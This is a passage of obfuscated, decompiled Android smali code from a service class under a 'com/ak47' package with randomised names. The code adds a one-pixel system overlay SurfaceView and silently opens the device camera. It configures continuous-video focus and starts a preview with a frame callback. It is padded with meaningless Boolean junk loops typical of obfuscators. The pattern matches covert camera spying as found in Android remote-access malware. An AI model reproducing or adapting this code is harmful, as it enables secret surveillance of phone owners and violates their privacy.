    iget-object v1, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    :goto_0
    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->a(Ljava/lang/String;I)V

    goto :goto_3

    :cond_0
    invoke-virtual/range {p0 .. p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->m()V

    goto :goto_3

    :cond_1
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->i()Z

    move-result v1

    iput-boolean v1, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->a:Z

    if-nez v1, :cond_0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->j:Landroid/view/WindowManager;

    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_2

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x1

    const/4 v9, 0x1

    const/16 v10, 0x7f6

    const/16 v11, 0x38

    const/4 v12, -0x3

    move-object v7, v1

    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    :goto_1
    sput-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->l:Landroid/view/WindowManager$LayoutParams;

    goto :goto_2

    :cond_2
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v14, 0x1

    const/4 v15, 0x1

    const/16 v16, 0x7d6

    const/high16 v17, 0x40000

    const/16 v18, -0x3

    move-object v13, v1

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    goto :goto_1

    :goto_2
    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->l:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->j:Landroid/view/WindowManager;

    sget-object v3, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    sget-object v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->l:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sget-object v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->k:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    iget-object v1, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :cond_3
    :goto_3
    return v4

    :catch_0
    return v2
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    sget-object p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    new-instance p2, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$b;

    invoke-direct {p2, p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$b;-><init>(Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 9

    const-string v0, "continuous-video"

    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    const-string v3, ","

    invoke-virtual {v1, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    :try_start_0
    aget-object v3, v1, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-static {v3}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v3

    sput-object v3, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_0
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_0

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_0

    :cond_0
    :goto_1
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_1

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_1

    :cond_1
    :goto_2
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_2

    :cond_2
    :goto_3
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_3

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_3
    :goto_4
    :try_start_1
    sget-object v3, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

    const/4 v4, 0x0

    sget-object v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {v5}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v5

    invoke-virtual {v5}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v5

    if-eqz v5, :cond_5

    sget-object v5, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {v5}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v5

    invoke-virtual {v5}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_4
    :goto_5
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_5

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/hardware/Camera$Size;

    iget v7, v6, Landroid/hardware/Camera$Size;->width:I

    const/16 v8, 0x258

    if-le v7, v8, :cond_4

    iget v7, v6, Landroid/hardware/Camera$Size;->height:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    const/16 v8, 0x190

    if-le v7, v8, :cond_4

    move-object v4, v6

    goto :goto_5

    :cond_5
    const/4 v5, 0x1

    :try_start_2
    array-length v6, v1

    if-le v6, v5, :cond_6

    aget-object v6, v1, v5

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    iput v6, v4, Landroid/hardware/Camera$Size;->width:I

    const/4 v6, 0x2

    aget-object v6, v1, v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    iput v6, v4, Landroid/hardware/Camera$Size;->height:I

    const/4 v6, 0x3

    aget-object v1, v1, v6

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->f:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_6

    :catch_1
    :try_start_3
    iput v2, v4, Landroid/hardware/Camera$Size;->width:I

    iput v2, v4, Landroid/hardware/Camera$Size;->height:I

    :cond_6
    :goto_6
    iget v1, v4, Landroid/hardware/Camera$Size;->width:I

    if-eqz v1, :cond_7

    iget v1, v4, Landroid/hardware/Camera$Size;->height:I

    if-nez v1, :cond_8

    :cond_7
    const/16 v1, 0x280

    iput v1, v4, Landroid/hardware/Camera$Size;->width:I

    const/16 v1, 0x1e0

    iput v1, v4, Landroid/hardware/Camera$Size;->height:I

    :cond_8
    iget-object v1, p0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->e:[Ljava/lang/String;

    const/4 v2, 0x4

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    if-ne v1, v5, :cond_9

    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, v0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_9

    invoke-virtual {v3, v0}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    :cond_9
    iget v0, v4, Landroid/hardware/Camera$Size;->width:I

    iget v1, v4, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v3, v0, v1}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v0, 0x11

    invoke-virtual {v3, v0}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {v0, v3}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    sget-object p1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12;->g:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_b

    :catch_2
    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :goto_7
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_a

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_7

    :cond_a
    :goto_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_b

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_8

    :cond_b
    :goto_9
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_c

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_9

    :cond_c
    :goto_a
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_d

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_a

    :cond_d
    :goto_b
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
